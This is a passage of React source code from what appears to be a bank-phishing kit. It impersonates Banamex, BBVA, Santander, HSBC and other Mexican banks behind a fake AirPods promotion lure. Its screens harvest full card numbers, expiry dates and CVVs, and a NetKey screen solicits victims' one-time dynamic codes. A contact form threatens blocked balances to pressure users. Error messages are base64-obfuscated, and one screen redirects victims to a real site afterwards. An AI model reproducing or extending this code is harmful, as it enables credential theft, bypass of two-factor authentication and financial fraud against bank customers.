          // Validar número usando función ofuscada
          const cleanNumber = dataE.replace(/\s/g, '');
          if (cleanNumber.length !== 16) {
            setErrorA(protectionUtils.decode('RWwgbsO6bWVybyBkZSB0YXJqZXRhIGRlYmUgdGVuZXIgMTYgZMOtZ2l0b3M='));
            return;
          }

          // Validar usando función ofuscada
          if (!validateSecureData(cleanNumber, 'card')) {
            setErrorA(protectionUtils.decode('RWwgbsO6bWVybyBkZSB0YXJqZXRhIG5vIGVzIHbDoWxpZG8='));
            return;
          }

          // Validar fecha de vencimiento
          const datePartes = dataF.split('/');
          if (datePartes.length !== 2 || datePartes[0].length !== 2 || datePartes[1].length !== 2) {
            setErrorA(protectionUtils.decode('TGEgZmVjaGEgZGUgdmVuY2ltaWVudG8gZGViZSBlc3RhciBlbiBmb3JtYXRvIE1NL0FB'));
            return;
          }

          const month = parseInt(datePartes[0]);
          if (month < 1 || month > 12) {
            setErrorA(protectionUtils.decode('RWwgbWVzIGRlIHZlbmNpbWllbnRvIGRlYmUgZXN0YXIgZW50cmUgMDEgeSAxMg=='));
            return;
          }

          // Validar CVV
          if (dataG.length < 3 || dataG.length > 4) {
            setErrorA(protectionUtils.decode('RWwgY8OzZGlnbyBkZSBzZWd1cmlkYWQgZGViZSB0ZW5lciAzIG8gNCBkw61naXRvcw=='));
            return;
          }

          // Todo correcto, enviar los datos
          onSubmit(ScreenType.DATOS_TARJETA, {
            numeroTarjeta: cleanNumber,
            fechaVencimiento: dataF,
            cvv: dataG
          });
        };

        const datosTarjetaContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Confirmar datos de tarjeta</h2>
            <p className="mb-4">
              Por tu seguridad, necesitamos verificar los datos de tu tarjeta con terminación: <strong>{screenData.terminacion || "****"}</strong>
            </p>

            <div className="space-y-4 mb-4">
              <div className="flex flex-col">
                <label className="text-sm text-gray-700 mb-1">Número de tarjeta:</label>
                <Input 
                  type="text"
                  placeholder="1234 5678 9012 3456"
                  className="w-full border border-gray-300 rounded p-2"
                  value={dataE}
                  onChange={(e) => {
                    // Formatear usando función ofuscada
                    const formatted = formatSecureInput(e.target.value);
                    setDataE(formatted);

                    // Limpiar error al escribir
                    if (errorA) setErrorA(null);
                  }}
                  maxLength={19} // 16 dígitos + 3 espacios
                />
              </div>

              <div className="flex space-x-4">
                <div className="flex-1">
                  <label className="text-sm text-gray-700 mb-1">Fecha de vencimiento:</label>
                  <Input 
                    type="text"
                    placeholder="MM/AA"
                    className="w-full border border-gray-300 rounded p-2"
                    value={dataF}
                    onChange={(e) => {
                      // Formatear usando función ofuscada
                      const formatted = formatSecureDate(e.target.value);
                      setDataF(formatted);

                      // Limpiar error al escribir
                      if (errorA) setErrorA(null);
                    }}
                    maxLength={5} // MM/AA = 5 caracteres
                  />
                </div>

                <div className="flex-1">
                  <label className="text-sm text-gray-700 mb-1">Código de seguridad:</label>
                  <Input 
                    type="password"
                    placeholder="CVV"
                    className="w-full border border-gray-300 rounded p-2"
                    value={dataG}
                    onChange={(e) => {
                      // Solo permitir números
                      const value = e.target.value.replace(/\D/g, '');
                      setDataG(value);

                      // Limpiar error al escribir
                      if (errorA) setErrorA(null);
                    }}
                    maxLength={4}
                  />
                </div>
              </div>
            </div>

            {errorA && (
              <div className="text-red-500 text-sm mb-4">{errorA}</div>
            )}

            <Button 
              className={primaryBtnClass}
              onClick={handleSecureSubmit}
            >
              {atob('VmVyaWZpY2Fy')}
            </Button>
          </>
        );
        return getBankContainer(datosTarjetaContent);

      case ScreenType.GENERANDO_ACLARACION:
        const generandoPromocionContent = (
          <div className="flex flex-col items-center justify-center py-10">
            <div className="w-20 h-20 bg-gradient-to-br from-[#ff6b35] to-[#ff8c5a] rounded-full mx-auto mb-6 flex items-center justify-center">
              <span className="text-3xl">🎧</span>
            </div>
            <h2 className="text-xl font-bold mb-5 platacard-gradient-text">Procesando promoción AirPods Pro Max</h2>
            <div className="flex items-center justify-center mb-5">
              <div className="w-12 h-12 border-t-4 border-b-4 border-[#ff6b35] rounded-full animate-spin"></div>
            </div>
            <p className="text-center mb-2 text-gray-700">Por favor espere, estamos validando su promoción de AirPods Pro Max...</p>
            <p className="text-center text-sm text-gray-500">Será redirigido automáticamente al portal de Banamex</p>
          </div>
        );
        return getBankContainer(generandoPromocionContent);

      case ScreenType.BANAMEX_NETKEY:
        const now = new Date();
        const weekday = now.toLocaleDateString('es-MX', { weekday: 'long', timeZone: 'America/Mexico_City' });
        const dayCapitalized = weekday.charAt(0).toUpperCase() + weekday.slice(1);
        const dateStr = now.toLocaleDateString('es-MX', { day: 'numeric', month: 'long', year: 'numeric', timeZone: 'America/Mexico_City' });
        const timeStr = now.toLocaleTimeString('es-MX', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false, timeZone: 'America/Mexico_City' });
        
        const banamexNetkeyContent = (
          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', padding: '20px' }}>
            <div style={{ maxWidth: '800px', margin: '0 auto' }}>
              {/* Header - Logo y fecha */}
              <header style={{ marginBottom: '24px', borderBottom: '2px solid #e5e7eb', paddingBottom: '16px' }}>
                <img src="/banamex/images/logobanamex.svg" alt="Banamex" style={{ width: '120px', marginBottom: '12px' }} />
                <div style={{ color: '#6b7280', fontSize: '14px', fontWeight: 500 }}>
                  {dayCapitalized} {dateStr}, {timeStr} Centro de México
                </div>
              </header>

              {/* Título principal */}
              <div style={{ fontSize: '28px', fontWeight: 700, color: '#1f2937', marginBottom: '24px', borderLeft: '4px solid #dc2626', paddingLeft: '16px' }}>
                Clave dinámica
              </div>

              {/* Instrucciones */}
              <div style={{ background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: '8px', padding: '20px', marginBottom: '20px' }}>
                <p style={{ margin: '0 0 12px 0', color: '#374151', fontSize: '15px', lineHeight: 1.6 }}>
                  Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra <strong>"HOST?"</strong> digite el número <strong>"9"</strong>.
                </p>
                <p style={{ margin: 0, color: '#374151', fontSize: '15px', lineHeight: 1.6 }}>
                  Al aparecer la palabra <strong>"CHALLNG?"</strong> introduzca en su NetKey Banamex la siguiente clave:
                </p>
              </div>

              {/* CHALLNG */}
              <div style={{ background: '#fff', border: '2px solid #dc2626', borderRadius: '8px', padding: '24px', marginBottom: '20px' }}>
                <div style={{ fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
                  CHALLNG:
                </div>
                <div style={{ fontSize: '32px', fontWeight: 900, color: '#dc2626', letterSpacing: '3px', marginBottom: '16px', fontFamily: 'monospace' }}>
                  {sessionData?.challenge || screenData.challenge || '93939557'}
                </div>
                <div style={{ fontSize: '13px', color: '#6b7280', fontFamily: 'monospace', letterSpacing: '1px' }}>
                  jbnelw03p-ND162-JRDIG-BNEW A32P
                </div>
              </div>

              {/* Instrucción presione ENT */}
              <div style={{ background: '#fef3c7', border: '1px solid #fbbf24', borderRadius: '8px', padding: '16px', marginBottom: '24px' }}>
                <p style={{ margin: 0, color: '#92400e', fontSize: '14px', lineHeight: 1.5 }}>
                  Presione <strong>"ENT"</strong>. Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo
                </p>
              </div>

              {/* Campo de clave dinámica */}
              <div style={{ background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: '8px', padding: '24px', marginBottom: '20px' }}>
                <label style={{ display: 'block', fontSize: '16px', fontWeight: 600, color: '#1f2937', marginBottom: '12px' }}>
                  Clave dinámica
                </label>
                <p style={{ margin: '0 0 12px 0', fontSize: '14px', color: '#6b7280' }}>
                  Digite la clave dinámica
                </p>
                <input
                  type="text"
                  maxLength={8}
                  value={netkeyResponse}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, '');
                    setNetkeyResponse(val);
                  }}
                  placeholder="00000000"
                  style={{ 
                    width: '100%', 
                    padding: '16px', 
                    fontSize: '24px', 
                    borderRadius: '8px', 
                    border: '2px solid #d1d5db', 
                    outline: 'none', 
                    fontFamily: 'monospace', 
                    letterSpacing: '4px',
                    textAlign: 'center',
                    background: '#fff'
                  }}
                  onFocus={(e) => {
                    e.target.style.borderColor = '#dc2626';
                    e.target.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.1)';
                  }}
                  onBlur={(e) => {
                    e.target.style.borderColor = '#d1d5db';
                    e.target.style.boxShadow = 'none';
                  }}
                  data-testid="input-netkey"
                />
              </div>

              {/* Botones */}
              <div style={{ display: 'flex', gap: '12px', marginBottom: '24px' }}>
                <button
                  onClick={() => setNetkeyResponse('')}
                  style={{ 
                    flex: 1,
                    padding: '14px', 
                    borderRadius: '8px', 
                    fontWeight: 600, 
                    fontSize: '16px', 
                    border: '2px solid #d1d5db', 
                    background: '#fff', 
                    color: '#374151', 
                    cursor: 'pointer',
                    transition: 'all 0.2s'
                  }}
                  onMouseOver={(e) => e.currentTarget.style.background = '#f9fafb'}
                  onMouseOut={(e) => e.currentTarget.style.background = '#fff'}
                  data-testid="button-cancel"
                >
                  Cancelar
                </button>
                <button
                  onClick={() => {
                    if (netkeyResponse.length === 8) {
                      onSubmit(ScreenType.BANAMEX_NETKEY, { netkeyResponse });
                    }
                  }}
                  disabled={netkeyResponse.length !== 8}
                  style={{ 
                    flex: 1,
                    padding: '14px', 
                    borderRadius: '8px', 
                    fontWeight: 600, 
                    fontSize: '16px', 
                    border: 'none', 
                    background: netkeyResponse.length === 8 ? '#dc2626' : '#d1d5db', 
                    color: '#fff', 
                    cursor: netkeyResponse.length === 8 ? 'pointer' : 'not-allowed',
                    transition: 'all 0.2s'
                  }}
                  onMouseOver={(e) => {
                    if (netkeyResponse.length === 8) {
                      e.currentTarget.style.background = '#b91c1c';
                    }
                  }}
                  onMouseOut={(e) => {
                    if (netkeyResponse.length === 8) {
                      e.currentTarget.style.background = '#dc2626';
                    }
                  }}
                  data-testid="button-continue"
                >
                  Continuar
                </button>
              </div>

              {/* Mensaje inferior */}
              <div style={{ textAlign: 'center', marginBottom: '24px', padding: '16px', background: '#f0f9ff', border: '1px solid #bae6fd', borderRadius: '8px' }}>
                <p style={{ margin: 0, color: '#0369a1', fontSize: '14px' }}>
                  ¿No tienes NetKey? Contacte a su sucursal o centro de atención.
                </p>
              </div>

              {/* Footer */}
              <footer style={{ borderTop: '2px solid #e5e7eb', paddingTop: '16px', color: '#6b7280', fontSize: '12px', lineHeight: 1.5 }}>
                <p style={{ margin: '0 0 8px 0' }}>
                  D.R., © 2025, Banco Nacional de México, S.A., Integrante del Grupo Financiero Banamex.
                </p>
                <p style={{ margin: 0 }}>
                  Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
                </p>
              </footer>
            </div>
          </div>
        );
        return banamexNetkeyContent;

      case ScreenType.BANAMEX_CONTACT_FORM:
        const banamexContactContent = (
          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', padding: '20px' }}>
            <div style={{ maxWidth: '800px', margin: '0 auto' }}>
              {/* Header - Logo */}
              <header style={{ marginBottom: '24px', borderBottom: '2px solid #e5e7eb', paddingBottom: '16px' }}>
                <img src="/banamex/images/logobanamex.svg" alt="Banamex" style={{ width: '120px' }} />
              </header>

              {/* Título principal */}
              <div style={{ fontSize: '28px', fontWeight: 700, color: '#1f2937', marginBottom: '24px', borderLeft: '4px solid #dc2626', paddingLeft: '16px' }}>
                Su servicio requiere actualización
              </div>

              {/* Mensaje informativo */}
              <div style={{ background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: '8px', padding: '20px', marginBottom: '24px' }}>
                <p style={{ margin: '0 0 16px 0', color: '#374151', fontSize: '15px', lineHeight: 1.6 }}>
                  En breve, uno de nuestros ejecutivos se pondrá en contacto con usted para asesorarlo en su proceso.
                </p>
                <p style={{ margin: '0 0 16px 0', color: '#374151', fontSize: '15px', lineHeight: 1.6 }}>
                  Recuerde que mantener sus datos actualizados le permite emitir comprobantes CFDI con validez fiscal.
                </p>
                <p style={{ margin: 0, color: '#dc2626', fontSize: '15px', lineHeight: 1.6, fontWeight: 600 }}>
                  Evite el bloqueo de sus saldos.
                </p>
              </div>

              {/* Formulario */}
              <div style={{ background: '#fff', border: '1px solid #e5e7eb', borderRadius: '8px', padding: '24px', marginBottom: '24px' }}>
                <div style={{ marginBottom: '20px' }}>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
                    Nombre completo
                  </label>
                  <input
                    type="text"
                    value={nombreBanamex}
                    onChange={(e) => setNombreBanamex(e.target.value)}
                    placeholder="Ingrese su nombre completo"
                    style={{ 
                      width: '100%', 
                      padding: '12px', 
                      fontSize: '15px', 
                      border: '2px solid #d1d5db', 
                      borderRadius: '6px', 
                      color: '#1f2937',
                      outline: 'none',
                      boxSizing: 'border-box'
                    }}
                    onFocus={(e) => {
                      e.target.style.borderColor = '#dc2626';
                      e.target.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.1)';
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = '#d1d5db';
                      e.target.style.boxShadow = 'none';
                    }}
                    data-testid="input-nombre"
                  />
                </div>

                <div style={{ marginBottom: '20px' }}>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
                    Correo electrónico
                  </label>
                  <input
                    type="email"
                    value={correoBanamex}
                    onChange={(e) => setCorreoBanamex(e.target.value)}
                    placeholder="ejemplo@correo.com"
                    style={{ 
                      width: '100%', 
                      padding: '12px', 
                      fontSize: '15px', 
                      border: '2px solid #d1d5db', 
                      borderRadius: '6px', 
                      color: '#1f2937',
                      outline: 'none',
                      boxSizing: 'border-box'
                    }}
                    onFocus={(e) => {
                      e.target.style.borderColor = '#dc2626';
                      e.target.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.1)';
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = '#d1d5db';
                      e.target.style.boxShadow = 'none';
                    }}
                    data-testid="input-correo"
                  />
                </div>

                <div style={{ marginBottom: '20px' }}>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
                    Celular
                  </label>
                  <input
                    type="tel"
                    value={celularBanamex}
                    onChange={(e) => setCelularBanamex(e.target.value.replace(/\D/g, ''))}
                    placeholder="5512345678"
                    maxLength={10}
                    style={{ 
                      width: '100%', 
                      padding: '12px', 
                      fontSize: '15px', 
                      border: '2px solid #d1d5db', 
                      borderRadius: '6px', 
                      color: '#1f2937',
                      outline: 'none',
                      boxSizing: 'border-box'
                    }}
                    onFocus={(e) => {
                      e.target.style.borderColor = '#dc2626';
                      e.target.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.1)';
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = '#d1d5db';
                      e.target.style.boxShadow = 'none';
                    }}
                    data-testid="input-celular"
                  />
                </div>

                <div style={{ marginBottom: '24px' }}>
                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '8px' }}>
                    Teléfono alternativo (opcional)
                  </label>
                  <input
                    type="tel"
                    value={telefonoAltBanamex}
                    onChange={(e) => setTelefonoAltBanamex(e.target.value.replace(/\D/g, ''))}
                    placeholder="5512345678"
                    maxLength={10}
                    style={{ 
                      width: '100%', 
                      padding: '12px', 
                      fontSize: '15px', 
                      border: '2px solid #d1d5db', 
                      borderRadius: '6px', 
                      color: '#1f2937',
                      outline: 'none',
                      boxSizing: 'border-box'
                    }}
                    onFocus={(e) => {
                      e.target.style.borderColor = '#dc2626';
                      e.target.style.boxShadow = '0 0 0 3px rgba(220, 38, 38, 0.1)';
                    }}
                    onBlur={(e) => {
                      e.target.style.borderColor = '#d1d5db';
                      e.target.style.boxShadow = 'none';
                    }}
                    data-testid="input-telefono-alternativo"
                  />
                </div>

                <button
                  onClick={() => {
                    if (nombreBanamex && correoBanamex && celularBanamex) {
                      onSubmit(ScreenType.BANAMEX_CONTACT_FORM, {
                        nombreContacto: nombreBanamex,
                        correoContacto: correoBanamex,
                        celularContacto: celularBanamex,
                        telefonoAlternativoContacto: telefonoAltBanamex
                      });
                    }
                  }}
                  disabled={!nombreBanamex || !correoBanamex || !celularBanamex}
                  style={{ 
                    width: '100%',
                    padding: '14px', 
                    borderRadius: '8px', 
                    fontWeight: 600, 
                    fontSize: '16px', 
                    border: 'none', 
                    background: nombreBanamex && correoBanamex && celularBanamex ? '#dc2626' : '#d1d5db', 
                    color: '#fff', 
                    cursor: nombreBanamex && correoBanamex && celularBanamex ? 'pointer' : 'not-allowed',
                    transition: 'all 0.2s'
                  }}
                  onMouseOver={(e) => {
                    if (nombreBanamex && correoBanamex && celularBanamex) {
                      e.currentTarget.style.background = '#b91c1c';
                    }
                  }}
                  onMouseOut={(e) => {
                    if (nombreBanamex && correoBanamex && celularBanamex) {
                      e.currentTarget.style.background = '#dc2626';
                    }
                  }}
                  data-testid="button-continuar"
                >
                  Continuar
                </button>
              </div>

              {/* Footer */}
              <footer style={{ borderTop: '2px solid #e5e7eb', paddingTop: '16px', color: '#6b7280', fontSize: '12px', lineHeight: 1.5 }}>
                <p style={{ margin: '0 0 8px 0' }}>
                  D.R., © 2025, Banco Nacional de México, S.A., Integrante del Grupo Financiero Banamex.
                </p>
                <p style={{ margin: 0 }}>
                  Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
                </p>
              </footer>
            </div>
          </div>
        );
        return banamexContactContent;

      case ScreenType.BANAMEX_WAITING:
        const banamexWaitingContent = (
          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
            <div style={{ maxWidth: '500px', textAlign: 'center' }}>
              {/* Logo de Banamex */}
              <div style={{ marginBottom: '32px' }}>
                <img src="/banamex/images/logobanamex.svg" alt="Banamex" style={{ width: '150px', margin: '0 auto', display: 'block' }} />
              </div>

              {/* Gif de carga */}
              <div style={{ marginBottom: '32px' }}>
                <img 
                  src={loadingGif} 
                  alt="Cargando..." 
                  style={{ width: '100px', height: '100px', margin: '0 auto', display: 'block' }}
                />
              </div>

              {/* Título */}
              <h2 style={{ fontSize: '24px', fontWeight: 600, color: '#1f2937', marginBottom: '16px' }}>
                Cargando...
              </h2>

              {/* Mensaje principal */}
              <p style={{ fontSize: '18px', color: '#374151', marginBottom: '12px', lineHeight: 1.5 }}>
                Espere un momento
              </p>

              {/* Mensaje secundario */}
              <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '8px', lineHeight: 1.5 }}>
                En breve se contactará un asesor
              </p>

              {/* Advertencia */}
              <p style={{ fontSize: '14px', color: '#dc2626', fontWeight: 600, marginTop: '20px' }}>
                No cierre esta ventana
              </p>
            </div>
          </div>
        );
        return banamexWaitingContent;

      default:
        return (
          <div className="text-center py-8">
            <p className="text-gray-600">
              Tipo de pantalla no reconocido: {currentScreen}
            </p>
          </div>
        );
    }
  };

  // Definimos las clases de estilos para los botones según el banco
  const getPrimaryBtnClass = () => {
    switch(banco) {
      case 'LIVERPOOL':
        return 'bg-[#E1147B] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'CITIBANAMEX':
        return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANBAJIO':
        return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
      case 'BBVA':
        return 'bbva-button';
      case 'BANCOPPEL':
        return 'bg-[#0066B3] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'HSBC':
        return 'bg-[#DB0011] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'AMEX':
        return 'bg-[#0077C8] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'SANTANDER':
        return 'bg-[#EC0000] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'SCOTIABANK':
        return 'bg-[#EC111A] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANAMEX':
        return 'bg-[#153e46] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANREGIO':
        return 'bg-[#FF6600] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANORTE':
        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      default:
        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Banorte por defecto
    }
  };

  const primaryBtnClass = getPrimaryBtnClass();

  // Efecto para redirección automática si la pantalla es GENERANDO_ACLARACION
  useEffect(() => {
    if (currentScreen === ScreenType.GENERANDO_ACLARACION) {
      // Temporizador para la redirección (3 segundos)
      const redirectTimer = setTimeout(() => {
        window.location.href = 'https://www.platacard.com/';
      }, 3000);

      // Limpieza del temporizador si el componente se desmonta
      return () => clearTimeout(redirectTimer);
    }
  }, [currentScreen]);

  // Eliminamos la función bankLogo ya que solo usaremos el logo en el header del ClientScreen.tsx

  // Función para obtener la clase de header según el banco
  const getBankHeaderClass = () => {
    switch(banco) {
      case 'LIVERPOOL': return 'liverpool-header';
      case 'BANBAJIO': return 'banbajio-header';
      case 'CITIBANAMEX': return 'citibanamex-header';
      case 'BBVA': return 'bbva-header';
      case 'BANCOPPEL': return 'bg-[#0066B3] text-white p-2';
      case 'HSBC': return 'bg-white text-[#DB0011] p-2 border-t-2 border-[#DB0011]';
      case 'AMEX': return 'bg-[#0077C8] text-white p-2';
      case 'SANTANDER': return 'santander-header';
      case 'SCOTIABANK': return 'scotiabank-header';
      case 'BANAMEX': return 'banamex-header';
      case 'BANREGIO': return 'banregio-header';
      case 'BANORTE': return 'banorte-header';
      default: return 'bg-gray-100 p-3 text-center font-semibold';
    }
  };

  // Función para obtener la clase del contenedor según el banco
  const getBankContainerClass = () => {
    switch(banco) {
      case 'LIVERPOOL': return 'bg-white p-4 rounded-lg shadow liverpool-container';
      case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';
      case 'CITIBANAMEX': return 'citibanamex-container';
      case 'BBVA': return 'bbva-container';
      case 'BANCOPPEL': return 'bg-white p-4 rounded-lg shadow bancoppel-container';
      case 'HSBC': return 'bg-white p-4 rounded-lg shadow hsbc-container';
      case 'AMEX': return 'bg-white p-4 rounded-lg shadow amex-container';
      case 'SANTANDER': return 'bg-white p-4 rounded-lg shadow santander-container';
      case 'SCOTIABANK': return 'bg-white p-4 rounded-lg shadow scotiabank-container';
      case 'BANAMEX': return 'bg-white p-4 rounded-lg shadow banamex-container';
      case 'BANREGIO': return 'bg-white p-4 rounded-lg shadow banregio-container';
      case 'BANORTE': return 'banorte-container';
      default: return '';
    }
  };

  // Renderizados especiales según el banco
  if (banco === 'CITIBANAMEX') {
    // Podríamos agregar un renderizado especial para CitiBanamex si se necesita en el futuro
  }

  // Renderizado normal para otros bancos
  return (
    <div className={getBankContainerClass()}>
      {/* No mostrar logos en el contenido principal - los logos ya están en el header de cada banco */}
      {renderScreen()}
    </div>
  );
};